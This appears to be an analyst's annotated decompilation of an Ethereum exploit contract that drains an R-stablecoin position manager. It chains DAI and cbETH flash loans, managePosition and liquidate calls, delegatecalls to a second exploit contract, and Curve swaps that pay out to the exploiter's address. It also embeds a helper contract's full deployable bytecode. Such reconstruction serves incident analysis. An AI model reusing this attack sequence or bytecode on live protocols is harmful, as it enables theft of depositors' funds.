// 0x0A3340129816a86b62b7eafD61427f743c315ef8

// Data structures and variables inferred from the use of storage instructions
uint256 stor_11; // STORAGE[0x11] // uint 9
uint256 WETHToken; // STORAGE[0x0] bytes 0 to 19 // 0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2 (WETH token contract)
uint256 DAIToken; // STORAGE[0x1] bytes 0 to 19 // 0x6b175474e89094c44da98b954eedeac495271d0f (Dai token contract)
uint256 cbETHToken; // STORAGE[0x3] bytes 0 to 19 //0xbe9895146f7af43049ca1c1ae358b0541ea49704 (Coinbase Wrapped Staked ETH (cbETH))
uint256 stor_7_0_19; // STORAGE[0x7] bytes 0 to 19 // 0x9ab6b21cdf116f611110b048987e58894786c244 (InterestRatePositionManager)
uint256 RToken; // STORAGE[0x8] bytes 0 to 19 // 0x183015a9ba6ff60230fdeadc3f43b3d788b13e21 (RToken contract)
uint256 AavePoolV3; // STORAGE[0xa] bytes 0 to 19 // 0x87870bca3f3fd6335c3f4ce8392d69350b4fa4e2 (Aave Pool V3)
uint256 _onFlashLoan; // STORAGE[0xb] bytes 0 to 19 // 0x60744434d6339a6b27d73d9eda62b6f66a0a04fa (DssFlash Contract)
uint256 CurveFiPoolcbEthwEth; // STORAGE[0xc] bytes 0 to 19 // 0x5fae7e604fc3e24fd43a72867cebac94c65b404a (Curve.fi Pool cbETH / wETH)
uint256 BalancerV2Vault; // STORAGE[0xd] bytes 0 to 19 // 0xba12222222228d8ba445958a75a0704d566bf2c8 (Balancer v2 Vault)
uint256 _uniswapV3SwapCallback; // STORAGE[0xe] bytes 0 to 19 //0x190ed02adaf1ef8039fcd3f006b42553467d5045 (UniswapV3Pool R stablecoin / USDC)
uint256 UniswapV3PoolDaiUsdc; // STORAGE[0xf] bytes 0 to 19 // 0x5777d92f208679db4b9778590fa3cab3ac9e2168 (UniswapV3Pool DAI / USDC)
uint256 UniswapV3PoolwETHUsdc; // STORAGE[0x10] bytes 0 to 19 // 0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640 (UniswapV3Pool wETH / USDC)
uint256 Exploit2; // STORAGE[0x26] bytes 0 to 19 // 0xfdc0feaa3f0830aa2756d943c6d7d39f1d587110 (Another exploit contract, Exploit2, by the same Owner)
uint256 owner; // STORAGE[0x27] bytes 0 to 19 = 0xc1f2b71A502B551a65Eee9C96318aFdD5fd439fA (Exploiter EOA)



function 0x11702872(uint256 varg0) public nonPayable { 
    require(msg.sender == owner);
    v0 = address(STORAGE[varg0 + 18]).call(uint32(0x721348d)).gas(msg.gas);}

function onFlashLoan(address varg0, address varg1, uint256 varg2, uint256 varg3, bytes varg4) public nonPayable { //onFlashLoan = 0x23e30c8b 
    require(msg.sender == _onFlashLoan);
    v3, /* uint256 */ v4 = Exploit2.delegatecall(MEM[(MEM[64]) len (MEM[64] + (v0.data + (varg4.length + 31 & ~0x1f) - MEM[64] - 32) - MEM[64])], MEM[(MEM[64]) len 0]).gas(msg.gas);
    return 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;
}

function 0x3b0113a4() public nonPayable { 
    require(msg.sender == owner);
    stor_11 = v0;
}

function 0x3f6a5f0e() public payable { 
    require(msg.sender == owner);
    v3, /* uint256 */ v4 = Exploit2.delegatecall(0x3f6a5f0e, v0).gas(msg.gas);

    v6 = _SafeMul(this.balance, 9);
    v7 = _SafeDiv(v6, 10);
    v8 = CurveFiPoolcbEthwEth.exchange(0, 1, this.balance, v7, bool(1), address(this)).value(this.balance).gas(msg.gas);
    v10 = create.code(v9.data, 4935).value(0); // 0x30481C87E3f221e1689126f92A4DF9F890c6ade5
    v12 = address(STORAGE[stor_11 + 18]).call(uint32(0xc5d9a359)).gas(msg.gas);
    v13 = 0x3a31(stor_11);
    stor_11 = v13;
}

function 0x4aa9f8ac(uint256 varg0, uint256 varg1) public payable { 

    require(msg.sender == owner);
    v25 = AavePoolV3.flashLoan(address(this), v4, v5, v11, address(this), v17, uint16(0), v26, cbETHToken).gas(msg.gas);
    v27, /* uint256 */ v28 = cbETHToken.balanceOf(address(this)).gas(msg.gas);
    v29 = _SafeMul(v28, 8);
    v30 = _SafeDiv(v29, 10);
    v31 = CurveFiPoolcbEthwEth.exchange(1, 0, v28, v30, bool(1), address(this)).gas(msg.gas);
    v32 = owner.call().value(this.balance).gas(!this.balance * 2300);
}

function 0x4c15fb94(address varg0, uint256 varg1) public nonPayable { 
    require(msg.sender == owner);
    if (varg0 - WETHToken) {
        v0, /* uint256 */ v1 = varg0.balanceOf(address(this)).gas(msg.gas);
        v2 = varg0.transfer(msg.sender, v1).gas(msg.gas);
    } else {
        v3, /* uint256 */ v4 = WETHToken.balanceOf(address(this)).gas(msg.gas);
        v5 = WETHToken.withdraw(v4).gas(msg.gas);
        v6 = msg.sender.call().value(this.balance).gas(!this.balance * 2300);
    }
    if (varg1 != 0) {
        v7 = _SafeSub(varg1, 1);
        v8 = address(STORAGE[v7 + 18]).call(uint32(0xaa429e66), varg0).gas(msg.gas);
    }
}

function 0x7e77e468() public payable { 
    require(msg.sender == owner);
    v3, /* bool */ v4 = _onFlashLoan.flashLoan(address(this), DAIToken, 50000000000000000000000000, v0, v5, address(0x0)).gas(msg.gas);
    v7 = create.code(v6.data, 4935).value(0); //0x9a2b82C00bC281FAbe23f5b720f0883Cf14eBe94
    v8 = cbETHToken.transfer(address(0x9a2b82C00bC281FAbe23f5b720f0883Cf14eBe94), 2000000000000000000).gas(msg.gas);
    v9 = address(0x9a2b82C00bC281FAbe23f5b720f0883Cf14eBe94).call(uint32(0xc5d9a359)).gas(msg.gas);
    v10 = 0x3a31(stor_11);
    stor_11 = v10;
}

function CALLBACK_SUCCESS() public nonPayable { 
    return 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;
}

function executeOperation(address[] varg0, uint256[] varg1, uint256[] varg2, address varg3, bytes varg4) public nonPayable { 
    v0, /* uint256 */ v1 = cbETHToken.balanceOf(address(this)).gas(msg.gas);
    v2 = cbETHToken.transfer(stor_7_0_19, v1).gas(msg.gas);
    if (address(varg4[0]) - address(0x0)) {
        v3 = stor_7_0_19.liquidate(address(varg4[0])).gas(msg.gas);
    } else {
        v4 = _SafeSub(stor_11, 1);
        v5 = stor_7_0_19.liquidate(address(STORAGE[v4 + 18])).gas(msg.gas);
    }
    v6 = new uint256[](0);
    v9, /* uint256 */ v10 = Exploit2.delegatecall(0xee4d195d, v6).gas(msg.gas);
    v14, /* uint256 */ v15 = Exploit2.delegatecall(0xa64ed556, varg4[32][32], varg4[64]).gas(msg.gas);
    require(bool(v14) == bool(1));
    return bool(1);
}

function 0xb529c612(uint256 _v0) public payable { //_v0 = 2
    require(msg.sender == owner);
    v0 = cbETHToken.approve(AavePoolV3, uint256.max).gas(msg.gas);
    v1 = cbETHToken.approve(CurveFiPoolcbEthwEth, uint256.max).gas(msg.gas);
    v2 = RToken.approve(stor_7_0_19, uint256.max).gas(msg.gas);
    v3 = DAIToken.approve(AavePoolV3, uint256.max).gas(msg.gas);
    v4 = DAIToken.approve(_onFlashLoan, uint256.max).gas(msg.gas);
    v5 = RToken.approve(BalancerV2Vault, uint256.max).gas(msg.gas);
    v6 = _SafeMul(this.balance, 9); //22.5 ETH
    v7 = _SafeDiv(v6, 10); //2,25
    v8 = CurveFiPoolcbEthwEth.exchange(0, 1, this.balance, v7, bool(1), address(this)).value(this.balance).gas(msg.gas);
    v9, /* uint256 */ v10 = cbETHToken.balanceOf(address(this)).gas(msg.gas);
    v11 = cbETHToken.approve(stor_7_0_19, uint256.max).gas(msg.gas);
    v12 = _SafeMul(varg0, 1000000000000000000);
    v13 = stor_7_0_19.managePosition(cbETHToken, address(this), v12, bool(1), 3000000000000000000000, bool(1), 1000000000000000000, address(0x0), 0, 0, uint8(0), 0, 0).gas(msg.gas);
}

function 0xbe2821b0() public payable { 
    require(msg.sender == owner);
    v0 = _SafeMul(this.balance, 9);
    v1 = _SafeDiv(v0, 10);
    v2 = CurveFiPoolcbEthwEth.exchange(0, 1, this.balance, v1, bool(1), address(this)).value(this.balance).gas(msg.gas);
    v4 = create.code(v3.data, 4935).value(0); //0x67ffc92eda90e744c45864b0bd70acf1738ff780
    v5 = cbETHToken.transfer(address(0x67ffc92eda90e744c45864b0bd70acf1738ff780), 2000000000000000000).gas(msg.gas);
    v6 = 0x67ffc92eda90e744c45864b0bd70acf1738ff780.call(uint32(0xc5d9a359)).gas(msg.gas);
    stor_11 = v7;
}

function 0xc92a5807() public nonPayable { 
    require(msg.sender == owner);
    stor_11 = stor_11 - 1;
}

function 0xce3b12fd(uint256 varg0, bool varg1, uint256 varg2, bool varg3) public nonPayable { 
    require(msg.sender == owner);
    v0 = _SafeMul(varg0, 1000000000000000000);
    v1 = _SafeMul(varg2, 1000000000000000000);
    v2 = stor_7_0_19.managePosition(cbETHToken, address(this), v0, varg1, v1, varg3, 1000000000000000000, address(0x0), 0, 0, uint8(0), 0, 0).gas(msg.gas);
}

function 0xd27b4915(address varg0) public payable { 
    require(msg.sender == owner);
    v3, /* bool */ v4 = _onFlashLoan.flashLoan(address(this), DAIToken, 0x295be96e64066972000000, v0, v5, varg0).gas(msg.gas);
}

function 0xd3429501(address varg0) public payable { 
    require(msg.sender == owner);
    v3, /* bool */ v4 = _onFlashLoan.flashLoan(address(this), DAIToken, 0x295be96e64066972000000, v0, v5, varg0).gas(msg.gas);
    MEM[(v6.data) len 4935] = 0x6080604052739ab6b21cdf116f611110b048987e58894786c2446000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073be9895146f7af43049ca1c1ae358b0541ea49704600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073d0db31473caad65428ba301d2174390d11d0c788600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073183015a9ba6ff60230fdeadc3f43b3d788b13e21600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550733cd40d6e8426c9f02fe7b23867661377e462df3d600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550737bebe1d451291099d8e05fa2676412c09c96dfbc600560006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561020d57600080fd5b5033600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506110e98061025e6000396000f3fe6080604052600436106100385760003560e01c80630721348d14610044578063aa429e661461005b578063c5d9a359146100845761003f565b3661003f57005b600080fd5b34801561005057600080fd5b5061005961009b565b005b34801561006757600080fd5b50610082600480360381019061007d9190610bdc565b610430565b005b34801561009057600080fd5b50610099610573565b005b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100f557600080fd5b6000600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630fdb11cf6040518163ffffffff1660e01b815260040160408051808303816000875af1158015610165573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906101899190610c3f565b5090506000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016101e99190610c8e565b602060405180830381865afa158015610206573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061022a9190610ca9565b90506000600560009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016102899190610c8e565b602060405180830381865afa1580156102a6573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102ca9190610ca9565b905060006040518060c00160405280600073ffffffffffffffffffffffffffffffffffffffff1681526020016000815260200160008152602001600060ff1681526020016000801b81526020016000801b81525090506000600167120a871cc002000086866103399190610d05565b6103439190610d76565b61034d9190610da7565b9050828111156104295760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663171672b1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16306000600188876103c79190610da7565b6001670de0b6b3a76400008a6040518963ffffffff1660e01b81526004016103f6989796959493929190610f53565b600060405180830381600087803b15801561041057600080fd5b505af1158015610424573d6000803e3d6000fd5b505050505b5050505050565b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461048a57600080fd5b8073ffffffffffffffffffffffffffffffffffffffff1663a9059cbb338373ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016104e09190610c8e565b602060405180830381865afa1580156104fd573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105219190610ca9565b6040518363ffffffff1660e01b815260040161053e929190610fd1565b600060405180830381600087803b15801561055857600080fd5b505af115801561056c573d6000803e3d6000fd5b5050505050565b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146105cd57600080fd5b6000600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630fdb11cf6040518163ffffffff1660e01b815260040160408051808303816000875af115801561063d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106619190610c3f565b509050600067120a871cc002000082671bc16d674ec800006106839190610d05565b61068d9190610d76565b9050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b360008054906101000a900473ffffffffffffffffffffffffffffffffffffffff167fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff6040518363ffffffff1660e01b815260040161072c929190610fd1565b600060405180830381600087803b15801561074657600080fd5b505af115801561075a573d6000803e3d6000fd5b5050505060006040518060c00160405280600073ffffffffffffffffffffffffffffffffffffffff1681526020016000815260200160008152602001600060ff1681526020016000801b81526020016000801b815250905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663171672b1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1630671bc16d674ec800006001876001670de0b6b3a7640000896040518963ffffffff1660e01b815260040161084d989796959493929190611035565b600060405180830381600087803b15801561086757600080fd5b505af115801561087b573d6000803e3d6000fd5b505050506000600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016108dc9190610c8e565b602060405180830381865afa1580156108f9573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061091d9190610ca9565b9050671bc16d674ec80000811115610a43576000600167120a871cc002000086671bc16d674ec80000856109519190610da7565b61095b9190610d05565b6109659190610d76565b61096f9190610da7565b90506000811115610a415760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663171672b1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff163060006001866001670de0b6b3a76400008b6040518963ffffffff1660e01b8152600401610a0e989796959493929190610f53565b600060405180830381600087803b158015610a2857600080fd5b505af1158015610a3c573d6000803e3d6000fd5b505050505b505b6000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610aa09190610c8e565b602060405180830381865afa158015610abd573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610ae19190610ca9565b9050600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb33836040518363ffffffff1660e01b8152600401610b40929190610fd1565b600060405180830381600087803b158015610b5a57600080fd5b505af1158015610b6e573d6000803e3d6000fd5b505050505050505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610ba982610b7e565b9050919050565b610bb981610b9e565b8114610bc457600080fd5b50565b600081359050610bd681610bb0565b92915050565b600060208284031215610bf257610bf1610b79565b5b6000610c0084828501610bc7565b91505092915050565b6000819050919050565b610c1c81610c09565b8114610c2757600080fd5b50565b600081519050610c3981610c13565b92915050565b60008060408385031215610c5657610c55610b79565b5b6000610c6485828601610c2a565b9250506020610c7585828601610c2a565b9150509250929050565b610c8881610b9e565b82525050565b6000602082019050610ca36000830184610c7f565b92915050565b600060208284031215610cbf57610cbe610b79565b5b6000610ccd84828501610c2a565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610d1082610c09565b9150610d1b83610c09565b9250828202610d2981610c09565b91508282048414831517610d4057610d3f610cd6565b5b5092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000610d8182610c09565b9150610d8c83610c09565b925082610d9c57610d9b610d47565b5b828204905092915050565b6000610db282610c09565b9150610dbd83610c09565b9250828203905081811115610dd557610dd4610cd6565b5b92915050565b6000819050919050565b6000819050919050565b6000610e0a610e05610e0084610ddb565b610de5565b610c09565b9050919050565b610e1a81610def565b82525050565b60008115159050919050565b610e3581610e20565b82525050565b610e4481610c09565b82525050565b6000819050919050565b6000610e6f610e6a610e6584610e4a565b610de5565b610c09565b9050919050565b610e7f81610e54565b82525050565b610e8e81610b9e565b82525050565b610e9d81610c09565b82525050565b600060ff82169050919050565b610eb981610ea3565b82525050565b6000819050919050565b610ed281610ebf565b82525050565b60c082016000820151610eee6000850182610e85565b506020820151610f016020850182610e94565b506040820151610f146040850182610e94565b506060820151610f276060850182610eb0565b506080820151610f3a6080850182610ec9565b5060a0820151610f4d60a0850182610ec9565b50505050565b60006101a082019050610f69600083018b610c7f565b610f76602083018a610c7f565b610f836040830189610e11565b610f906060830188610e2c565b610f9d6080830187610e3b565b610faa60a0830186610e2c565b610fb760c0830185610e76565b610fc460e0830184610ed8565b9998505050505050505050565b6000604082019050610fe66000830185610c7f565b610ff36020830184610e3b565b9392505050565b6000819050919050565b600061101f61101a61101584610ffa565b610de5565b610c09565b9050919050565b61102f81611004565b82525050565b60006101a08201905061104b600083018b610c7f565b611058602083018a610c7f565b6110656040830189611026565b6110726060830188610e2c565b61107f6080830187610e3b565b61108c60a0830186610e2c565b61109960c0830185610e76565b6110a660e0830184610ed8565b999850505050505050505056fea2646970667358221220cf18177d720f0766874dee60d5ab6fe20a56312588f4e743838eeb0efd93470064736f6c63430008120033;
    v7 = create.code(v6.data, 4935).value(0);
    v8 = cbETHToken.transfer(address(STORAGE[stor_11 + 18]), 0x1bc16d674ec80000).gas(msg.gas);
    v9 = address(STORAGE[stor_11 + 18]).call(uint32(0xc5d9a359)).gas(msg.gas);
    stor_11 = v10;
}


function uniswapV3SwapCallback(int256 varg0, int256 varg1, bytes varg2) public nonPayable { 
    v0 = v1 = msg.sender == _uniswapV3SwapCallback;
    if (msg.sender != _uniswapV3SwapCallback) {
        v0 = v2 = msg.sender == UniswapV3PoolDaiUsdc;
    }
    if (!v0) {
        v0 = msg.sender == UniswapV3PoolwETHUsdc;
    }
    require(v0);
    if (varg0 > 0) {
        v3, /* address */ v4 = msg.sender.token0().gas(msg.gas);
        v5 = address(v4).transfer(msg.sender, varg0).gas(msg.gas);
    }
    if (varg1 > 0) {
        v6, /* address */ v7 = msg.sender.token1().gas(msg.gas);
        v8 = address(v7).transfer(msg.sender, varg1).gas(msg.gas);
    }
}


function _SafeMul(uint256 varg0, uint256 varg1) private { 
    require(!varg0 | (varg1 == varg0 * varg1 / varg0), Panic(17)); // arithmetic overflow or underflow
    return varg0 * varg1;
}

function _SafeDiv(uint256 varg0, uint256 varg1) private { 
    require(varg1, Panic(18)); // division by zero
    return varg0 / varg1;
}

function _SafeSub(uint256 varg0, uint256 varg1) private { 
    require(varg0 - varg1 <= varg0, Panic(17)); // arithmetic overflow or underflow
    return varg0 - varg1;
}

function () public payable { 
}
